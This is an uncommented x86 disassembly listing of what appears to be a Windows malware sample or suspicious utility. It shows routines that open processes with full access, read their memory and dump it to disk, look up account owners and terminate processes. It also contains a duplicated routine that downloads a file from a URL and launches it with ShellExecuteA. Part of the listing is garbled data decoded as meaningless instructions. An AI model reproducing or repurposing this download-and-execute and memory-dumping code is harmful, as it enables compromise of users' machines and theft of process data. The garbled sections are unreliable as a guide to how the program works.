push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x4 ]
xor ecx ecx
mov eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406928
add esp 0x4
mov ebx esi
cmp edi ebx
jbe r-xdata
mov eax r-xdata
call sub_475e2c
push 0x0
call ExitThread
shl ecx 0x4
dec eax
test eax eax
jne r-xdata
mov eax esi
imul eax ecx
add [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_406934
mov eax [ ebp - 0x20 ]
push eax
call SetEndOfFile
mov eax [ ebp - 0x20 ]
push eax
call CloseHandle
mov eax [ ebp - 0x24 ]
push eax
call CloseHandle
push r-xdata
mov eax [ ebp - 0x34 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x40 ]
call sub_409e5c
push [ ebp - 0x40 ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
lea eax [ ebp - 0x3c ]
mov edx 0x5
call sub_4058e0
mov eax [ ebp - 0x3c ]
call sub_475e2c
push 0x0
call ExitThread
mov esi [ ebp - 0x38 ]
mov eax edi
sub eax ebx
cmp esi eax
jbe r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + edx - 0x1 ]
movzx eax al
add eax 0xffffffd0
cmp eax 0x36
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483be3
lea eax [ ebp - 0x4 ]
call sub_405530
retn
lea eax [ ebp - 0x30 ]
push eax
push 0x4
push esi
push ebx
mov eax [ ebp - 0x24 ]
push eax
call VirtualProtectEx
lea eax [ ebp - 0x28 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
push eax
push ebx
mov eax [ ebp - 0x24 ]
push eax
call ReadProcessMemory
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push esi
push ebx
mov eax [ ebp - 0x24 ]
push eax
call VirtualProtectEx
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call WriteFile
add ebx esi
cmp edi ebx
ja r-xdata
mov esi edi
sub esi ebx
mov ebx [ ebp - 0x4 ]
mov eax ebx
test eax eax
je r-xdata
movzx eax [ eax + lookup_table_483a50 ]
jmp [ eax * 4 + jump_table_483a87 ]
cmp eax edx
jne r-xdata
sub eax 0x4
mov eax [ eax ]
xor esi esi
jmp r-xdata
mov esi 0x1
jmp r-xdata
mov esi 0x2
jmp r-xdata
mov esi 0x3
jmp r-xdata
mov esi 0x4
jmp r-xdata
mov esi 0x5
jmp r-xdata
mov esi 0x6
jmp r-xdata
mov esi 0x7
jmp r-xdata
mov esi 0x8
jmp r-xdata
mov esi 0x9
jmp r-xdata
mov esi 0xa
jmp r-xdata
mov esi 0xa
jmp r-xdata
mov esi 0xb
jmp r-xdata
mov esi 0xb
jmp r-xdata
mov esi 0xc
jmp r-xdata
mov esi 0xc
jmp r-xdata
mov esi 0xd
jmp r-xdata
mov esi 0xd
jmp r-xdata
mov esi 0xe
jmp r-xdata
mov esi 0xe
jmp r-xdata
mov esi 0xf
jmp r-xdata
mov esi 0xf
mov ecx 0x1
mov eax ebx
test eax eax
je r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
cmp eax 0x1
jl r-xdata
sub eax 0x4
mov eax [ eax ]
dec edx
test edx edx
jne r-xdata
sub_483f50
push ebp
mov ebp esp
add esp 0xfffffecc
push ebx
push esi
xor edx edx
mov [ ebp - 0x130 ] edx
mov [ ebp - 0x134 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_484037
push [ fs : eax ]
mov [ fs : eax ] esp
or esi 0xffffffff
xor edx edx
mov eax 0x2
call sub_460d3c
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48403e
lea eax [ ebp - 0x134 ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov [ ebp - 0x12c ] 0x128
lea edx [ ebp - 0x12c ]
mov eax ebx
call sub_460d5c
cmp eax 0x1
sbb eax eax
inc eax
cmp al 0x1
jne r-xdata
jmp r-xdata
lea edx [ ebp - 0x12c ]
mov eax ebx
call sub_460d7c
cmp eax 0x1
sbb eax eax
inc eax
cmp al 0x1
je r-xdata
lea eax [ ebp - 0x134 ]
lea edx [ ebp - 0x108 ]
mov ecx 0x104
call sub_4057a0
mov eax [ ebp - 0x134 ]
lea edx [ ebp - 0x130 ]
call sub_409864
mov edx [ ebp - 0x130 ]
mov eax [ ebp - 0x4 ]
call sub_405b28
test eax eax
jle r-xdata
mov esi [ ebp - 0x124 ]
sub_484048
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi 0x28
mov eax esi
call sub_402f00
mov ebx eax
mov [ ebx ] esi
mov eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x1f0fff
call OpenProcess
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4840c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_461178
test eax eax
je r-xdata
xor eax eax
mov [ edi ] eax
mov eax [ ebx + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax ebx
call sub_402f1c
mov [ ebp - 0x5 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4840cb
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
retn
sub_4840d8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
xor edx edx
push ebp
push sub_484275
push [ fs : edx ]
mov [ fs : edx ] esp
mov [ ebp - 0x5 ] 0x0
push eax
push 0x0
push 0x400
call OpenProcess
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48427c
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_405554
retn
lea eax [ ebp - 0xc ]
push eax
push 0x8
push esi
call OpenProcessToken
test eax eax
je r-xdata
push esi
call CloseHandle
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x0
push 0x1
mov eax [ ebp - 0xc ]
push eax
call GetTokenInformation
cmp eax 0x1
sbb ebx ebx
inc ebx
xor eax eax
mov [ ebp - 0x14 ] eax
jmp r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
call CloseHandle
test bl bl
je r-xdata
call GetLastError
cmp eax 0x7a
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push eax
push 0x0
call LookupAccountSidA
cmp [ ebp - 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
call sub_402f34
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
push 0x1
mov eax [ ebp - 0xc ]
push eax
call GetTokenInformation
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
je r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_402f1c
mov eax edi
mov edx [ ebp - 0x1c ]
call sub_405c6c
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x20 ]
call sub_405c6c
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4059dc
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ edi ]
call sub_4059dc
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
push eax
push 0x0
call LookupAccountSidA
test eax eax
je r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax [ edi ]
call sub_4059dc
lea edx [ ebp - 0x24 ]
call sub_40aaa8
mov edx [ ebp - 0x24 ]
mov eax edi
call sub_405584
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4059dc
lea edx [ ebp - 0x28 ]
call sub_40aaa8
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_405584
sub_484288
push ebx
mov ebx edx
cmp eax 0x8
jne r-xdata
cmp eax 0xd
jne r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
pop ebx
retn
cmp eax 0x18
jne r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
cmp eax 0xa
jne r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
pop ebx
retn
cmp eax 0x6
jne r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
cmp eax 0x4
jne r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
mov eax ebx
mov edx r-xdata
call sub_405584
mov eax ebx
mov edx r-xdata
call sub_405584
jmp r-xdata
sub_484388
push ebp
mov ebp esp
add esp 0xfffffff8
push eax
push 0x0
push 0x1
call OpenProcess
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_4843e0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call GetExitCodeProcess
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call TerminateProcess
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call CloseHandle
retn
sub_4843ec
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx r-xdata
call sub_405584
push esi
push 0x0
push 0x1f0fff
call OpenProcess
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_48447b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push 0x104
lea ecx [ ebp - 0x108 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_461148
test eax eax
jne r-xdata
call sub_404f70
jmp r-xdata
mov eax ebx
lea edx [ ebp - 0x108 ]
mov ecx 0x104
call sub_4057a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call CloseHandle
retn
call sub_404f70
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4844a4
push ebp
mov ebp esp
mov ecx 0x2b
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x138 ]
mov ecx 0x4a
[ edi ] [ esi ]
mov esi edx
xor eax eax
push ebp
push sub_484689
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_405530
xor ebx ebx
jmp r-xdata
movzx eax bl
cmp [ ebp + eax - 0x114 ] 0x0
jne r-xdata
lea eax [ ebp - 0x13c ]
movzx edx bl
movzx edx [ ebp + edx - 0x114 ]
call sub_405718
mov edx [ ebp - 0x13c ]
lea eax [ ebp - 0x4 ]
call sub_405818
inc ebx
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x130 ]
call sub_484048
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x130 ]
call sub_4840d8
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
test eax eax
jne r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4055c8
test eax eax
jne r-xdata
sub eax 0x4
mov eax [ eax ]
push [ ebp - 0x4 ]
push r-xdata
lea edx [ ebp - 0x140 ]
mov eax [ ebp - 0x130 ]
call sub_4843ec
push [ ebp - 0x140 ]
push r-xdata
mov eax [ ebp - 0x124 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x144 ]
call sub_409e5c
push [ ebp - 0x144 ]
push r-xdata
mov eax [ ebp - 0x130 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x148 ]
call sub_409e5c
push [ ebp - 0x148 ]
push r-xdata
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x14c ]
call sub_409e5c
push [ ebp - 0x14c ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0xc ]
push r-xdata
mov eax [ ebp - 0x120 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x150 ]
call sub_409e5c
push [ ebp - 0x150 ]
push r-xdata
lea edx [ ebp - 0x154 ]
mov eax [ ebp - 0x11c ]
call sub_484288
push [ ebp - 0x154 ]
push r-xdata
call GetCurrentProcessId
xor edx edx
push edx
push eax
lea eax [ ebp - 0x158 ]
call sub_409e5c
push [ ebp - 0x158 ]
mov eax esi
mov edx 0x13
call sub_4058e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484690
lea eax [ ebp - 0x158 ]
mov edx 0x8
call sub_405554
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4055c8
sub_4846bc
push ebp
mov ebp esp
add esp 0xfffffecc
push ebx
xor edx edx
mov [ ebp - 0x134 ] edx
mov [ ebp - 0x130 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4847ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x12c ] 0x128
xor edx edx
mov eax 0xf
call sub_460d3c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4847a5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x12c ]
mov eax [ ebp - 0x4 ]
call sub_460d5c
test eax eax
je r-xdata
mov eax ebx
call sub_405530
push [ ebx ]
lea edx [ ebp - 0x130 ]
lea eax [ ebp - 0x12c ]
call sub_4844a4
push [ ebp - 0x130 ]
push r-xdata
mov eax ebx
mov edx 0x3
call sub_4058e0
jmp r-xdata
lea edx [ ebp - 0x12c ]
mov eax [ ebp - 0x4 ]
call sub_460d7c
test eax eax
jne r-xdata
push [ ebx ]
lea edx [ ebp - 0x134 ]
lea eax [ ebp - 0x12c ]
call sub_4844a4
push [ ebp - 0x134 ]
push r-xdata
mov eax ebx
mov edx 0x3
call sub_4058e0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4847ac
mov eax [ ebp - 0x4 ]
push eax
call CloseHandle
retn
sub_4847e8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ eax + 0x48 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x48 ] cl
dec eax
add [ eax + eax ] cl
add al bh
jg r-xdata
insb
outsd
popad
jb r-xdata
add [ eax + 0x78004048 ] bl
sti
inc ecx
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ ebx + edi * 8 ] al
inc ecx
add [ esp + edi * 8 ] ch
inc ecx
add [ eax ] dh
dec ebx
dec eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
adc [ esp + eax * 2 + 0x6f ] edx
ja r-xdata
add [ ebp - 0x62b6b ] cl
dec [ ebx + 0x42e8fc45 ]
push edx
add [ eax ] al
mov edx [ ebp - 0x62c ]
lea ecx [ ebp - 0x628 ]
mov eax [ ebp - 0x8 ]
call sub_48550c
mov edx [ ebp - 0x628 ]
lea eax [ ebp - 0x8 ]
call sub_4055c8
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
call sub_41beb4
push 0x0
push 0x0
mov eax [ ebp - 0x24 ]
call sub_41b734
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
call InternetOpenA
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push 0x64616572
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484b06
lea eax [ ebp - 0x634 ]
mov edx 0x4
call sub_405554
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
xor edx edx
push ebp
push sub_484acd
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x4000000
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov eax [ ebp - 0x10 ]
push eax
call InternetOpenUrlA
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov [ ebp - 0x18 ] 0x200
xor eax eax
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x624 ]
push eax
push 0x13
mov eax [ ebp - 0x14 ]
push eax
call HttpQueryInfoA
test eax eax
jne r-xdata
call sub_404f70
jmp r-xdata
lea eax [ ebp - 0x634 ]
lea edx [ ebp - 0x624 ]
mov ecx 0x200
call sub_4057a0
mov eax [ ebp - 0x634 ]
lea edx [ ebp - 0x630 ]
call sub_409b7c
mov eax [ ebp - 0x630 ]
mov edx r-xdata
call sub_405974
je r-xdata
call sub_404f70
jmp r-xdata
xor edx edx
push ebp
push sub_484a9b
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_404f70
jmp r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0x24 ]
call sub_41b734
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
jle r-xdata
cmp eax 0x0
jbe r-xdata
lea edx [ ebp - 0x424 ]
mov ecx [ ebx ]
mov eax [ ebp - 0x24 ]
mov esi [ eax ]
call [ esi + 0x10 ]
cmp [ ebx ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484aa2
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x24 ]
call sub_41be30
cmp [ ebp + 0x8 ] 0x0
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x424 ]
xor ecx ecx
mov edx 0x400
call sub_403af4
push ebx
push 0x400
lea eax [ ebp - 0x424 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call InternetReadFile
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
retn
mov eax [ ebp - 0x14 ]
push eax
call InternetCloseHandle
mov [ ebp - 0x9 ] 0x1
push 0x5
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
sub_48485c
push ebp
mov ebp esp
add esp 0xfffff9cc
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x630 ] ebx
mov [ ebp - 0x634 ] ebx
mov [ ebp - 0x628 ] ebx
mov [ ebp - 0x62c ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
lea ebx [ ebp - 0x20 ]
xor eax eax
push ebp
push sub_484aff
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
lea edx [ ebp - 0x62c ]
mov eax [ ebp - 0x4 ]
call sub_489afc
mov edx [ ebp - 0x62c ]
lea ecx [ ebp - 0x628 ]
mov eax [ ebp - 0x8 ]
call sub_48550c
mov edx [ ebp - 0x628 ]
lea eax [ ebp - 0x8 ]
call sub_4055c8
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
call sub_41beb4
push 0x0
push 0x0
mov eax [ ebp - 0x24 ]
call sub_41b734
push 0x0
push 0x0
push 0x0
push 0x1
push r-xdata
call InternetOpenA
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484b06
lea eax [ ebp - 0x634 ]
mov edx 0x4
call sub_405554
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
xor edx edx
push ebp
push sub_484acd
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x4000000
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
mov eax [ ebp - 0x10 ]
push eax
call InternetOpenUrlA
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov [ ebp - 0x18 ] 0x200
xor eax eax
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x624 ]
push eax
push 0x13
mov eax [ ebp - 0x14 ]
push eax
call HttpQueryInfoA
test eax eax
jne r-xdata
call sub_404f70
jmp r-xdata
lea eax [ ebp - 0x634 ]
lea edx [ ebp - 0x624 ]
mov ecx 0x200
call sub_4057a0
mov eax [ ebp - 0x634 ]
lea edx [ ebp - 0x630 ]
call sub_409b7c
mov eax [ ebp - 0x630 ]
mov edx r-xdata
call sub_405974
je r-xdata
call sub_404f70
jmp r-xdata
xor edx edx
push ebp
push sub_484a9b
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_404f70
jmp r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0x24 ]
call sub_41b734
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
cmp [ ebx ] 0x0
je r-xdata
jle r-xdata
cmp eax 0x0
jbe r-xdata
lea edx [ ebp - 0x424 ]
mov ecx [ ebx ]
mov eax [ ebp - 0x24 ]
mov esi [ eax ]
call [ esi + 0x10 ]
cmp [ ebx ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484aa2
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x24 ]
call sub_41be30
cmp [ ebp + 0x8 ] 0x0
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x424 ]
xor ecx ecx
mov edx 0x400
call sub_403af4
push ebx
push 0x400
lea eax [ ebp - 0x424 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call InternetReadFile
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
retn
mov eax [ ebp - 0x14 ]
push eax
call InternetCloseHandle
mov [ ebp - 0x9 ] 0x1
push 0x5
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
sub_484aa2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call InternetCloseHandle
retn
lea eax [ ebp - 0x24 ]
call sub_40f944
sub_484c87
xor ebx ebx
call sub_404f40
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x40 ] 0x2
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x40 ] 0x3
jne r-xdata
test bl bl
je r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0xc ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x2c ]
call sub_475e2c
lea eax [ ebp - 0x28 ]
mov ecx [ ebp - 0xc ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x28 ]
call sub_475e2c
jmp r-xdata
push 0x7d0
call Sleep
inc [ ebp - 0x18 ]
dec [ ebp - 0x1c ]
jne r-xdata
test bl bl
je r-xdata
lea eax [ ebp - 0x3c ]
call sub_48ce74
mov ecx [ ebp - 0x3c ]
lea eax [ ebp - 0x38 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x38 ]
call sub_475e2c
lea eax [ ebp - 0x34 ]
call sub_48ce74
mov ecx [ ebp - 0x34 ]
lea eax [ ebp - 0x30 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x30 ]
call sub_475e2c
jmp r-xdata
xor eax eax
push ebp
push sub_484c82
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x44 ]
mov edx [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_405a44
mov edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x10 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x8 ]
push eax
mov edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_405a44
mov edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x10 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
call sub_4055c8
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484d72
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
xor eax eax
call sub_475bd8
xor ebx ebx
mov bl 0x1
jmp r-xdata
retn
mov eax [ ebp - 0x14 ]
add eax 0x44
call sub_40f944
push ebx
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x14 ]
call sub_48485c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0x24 ]
call sub_48ce74
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x20 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x20 ]
call sub_475e2c
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x40 ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x40 ] 0x0
jne r-xdata
sub_484d72
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484da1
lea eax [ ebp - 0x3c ]
mov edx 0x8
call sub_405554
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_405554
retn
sub_484f08
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_484f66
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x44 ]
test eax eax
jne r-xdata
mov edx [ eax ]
call [ edx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ esi + 0x44 ] eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484f6d
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_484f74
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_484fb5
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x48 ]
mov edx [ ebp - 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484fbc
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_484fc0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
mov eax [ ebp - 0xc ]
call sub_4059cc
mov eax [ ebp + 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_4850ed
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4850b9
